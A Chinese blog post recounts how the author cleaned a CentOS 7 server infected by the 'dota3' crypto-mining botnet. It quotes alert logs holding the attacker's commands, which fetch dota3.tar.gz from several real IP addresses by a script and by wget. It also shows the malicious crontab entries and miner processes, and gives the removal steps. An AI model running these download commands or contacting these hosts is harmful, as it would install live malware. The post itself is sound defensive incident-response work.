---
layout: post
title: CentOS7 下处理挖矿僵尸网络dota3木马攻击
tags: linux CentOS security
categories: security
---
<style type="text/css">
    p{text-indent: 20px}
</style>
<p>凌晨的时候，收到阿里云服务器的告警短信。<span style="color:red">紧急安全事件：访问恶意下载源，访问恶意下载IP。</span> 瞬间惊醒，立刻爬起来处理。</p>

<p>先登录阿里云后台，查看安全中心的告警祥情，发现有几条记录：</p>
```shell
父进程路径：/usr/bin/bash
父进程命令行：sh -c ./tddwrt7s.sh "http://67.205.135.65/dota3.tar.gz" 
"http://91.121.51.120/dota3.tar.gz" "http://51.75.28.134/dota3.tar.gz" 
"http://159.203.17.176/dota3.tar.gz" "http://46.101.113.206/dota3.tar.gz" 
"http://104.131.189.116/dota3.tar.gz" "http://81.12.13.145/dota3.tar.gz" >.out 2>&1 3>&1
```
***
```shell
父进程id：15912
进程id：15913
用户名：user_web
URL链接：http://91.121.51.120/dota3.tar.gz
进程路径：/usr/bin/bash
命令行参数：/bin/bash ./tddwrt7s.sh http://67.205.135.65/dota3.tar.gz 
http://91.121.51.120/dota3.tar.gz http://51.75.28.134/dota3.tar.gz 
http://159.203.17.176/dota3.tar.gz http://46.101.113.206/dota3.tar.gz 
http://104.131.189.116/dota3.tar.gz http://81.12.13.145/dota3.tar.gz
```
***
```shell
父进程路径：/usr/bin/bash
父进程命令行：-bash
父进程id：9071
进程id：9186
用户名：user_web
URL链接：http://45.55.129.23/dota3.tar.gz
进程路径：/usr/bin/wget
命令行参数：wget http://45.55.129.23/dota3.tar.gz
```
***

root账号，登录服务器，排查问题。

查看服务器有无可疑的TCP端口：
$ netstat -lnpt
没有发现非常用端口。

根据告警信息，拿进程id找对应的进程，一个都没有找到。

### 一、立刻做几个操作：
1. 修改web_user密码（当前服务器除了root，就只有web_user授权ssh登录）；
2. 修改root密码，禁止root的ssh登录（只能先登录web_user，再切到root账号）；
3. 清掉/root/.ssh/authorized_keys 里面所有公钥（禁止所有密钥登录）；

然后，再一步步来查。
<p>没有找到对应的进程，看下是不是有crontab，定时执行，执行完进程就退出，找不到告警时的进程id。</p>

### 二、查找服务器所有账号的crontab:
```shell
$ cat /etc/passwd | cut -f 1 -d : |xargs -I {} crontab -l -u {}
...
no crontab for tcpdump
no crontab for ntp
no crontab for saslauth
no crontab for mysql
5 8 * * 0 /home/user_web/.configrc/a/upd>/dev/null 2>&1
@reboot /home/user_web/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/user_web/.configrc/b/sync>/dev/null 2>&1
@reboot /home/user_web/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
no crontab for haproxy
...
```
发现了crontab，脚本在user_web目录。

- 立刻删除 /home/user_web/目录下，crontab使用的 和 不认识的隐藏目录。
- 查看是不是user_web账号起的crontab：
```shell
$ crontab  -l -u user_web
5 8 * * 0 /home/user_web/.configrc/a/upd>/dev/null 2>&1
@reboot /home/user_web/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/user_web/.configrc/b/sync>/dev/null 2>&1
@reboot /home/user_web/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
```
果然是user_web起的。

- 清理web_user下所有的crontab。
```shell
$ crontab  -r -u user_web
```

### 三、查找还有没有使用user_web账号运行的进程：
```shell
$ ps -ef | grep user_web
user_web      25408     1  0 00:14 ?        00:00:00 /tmp/.X25-unix/.rsync/c/lib/64/tsm --library-path /tmp/.X25-unix/.rsync/c/lib/64/ /tmp/.X25-unix/.rsync/c/tsm64 -t 515 -f 1 -s 12 -S 10 -p 0 -d 1 p ip
root     32695 30901  0 01:06 pts/1    00:00:00 grep --color=auto user_web
user_web      18775     1  0 Mar25 ?        00:00:08 rsync
user_web      18790     1 99 Mar25 ?        00:40:06 ./kswapd0
```
找到了user_web执行的进程，脚本文件所在的路径，在 /tmp/ 目录下的隐藏文件。
进入目录：
```shell
$ cd /tmp/
```
进入目录，查看包括隐藏文件在内的所有文件：
```shell
$ ls -la
```
删掉隐藏目录：
```shell
$ rm -rf .X25-unix
```

### 四、根据告警中出现的进程路径/usr/bin/bash，再次查找sh脚本进程：
```shell
$ ps -ef | grep sh
user_web  3768      1  0 00:00 ?      00:00:00 /bin/bash ./go
root      24487     1  0 Mar25 ?      01:53:25 /usr/sbin/sshd -D
user_web  25403 25402  0 00:14 ?      00:00:00 /bin/bash ./tsm -t 515 -f 1 -s 12 -S 10 -p 0 -d 1 p ip
root      30862 24487  0 01:37 ?      00:00:01 sshd: user_web [priv]
user_web  30866 30862  0 01:37 ?      00:00:00 sshd: user_web@pts/1
user_web  30867 30866  0 01:37 pts/1  00:00:00 -bash
root      30901 30896  0 01:38 pts/1  00:00:00 bash
root      31799 30901  0 01:53 pts/1  00:00:00 grep --color=auto sh
```
又找到了几个可疑的进程。查看进程信息，找进程执行路径cwd，对应的执行命令cmd：
```shell
$ ll /proc/25403 
```
找到进程脚本路径，删掉脚本文件所在的文件夹：

至此，清理完毕。

### 后续： 加强异地登录的告警，强化账号登录的认证，添加部署谷歌验证器(Google Authenticator) 

>后记，观察几天，再没有收到阿里云的告警信息。


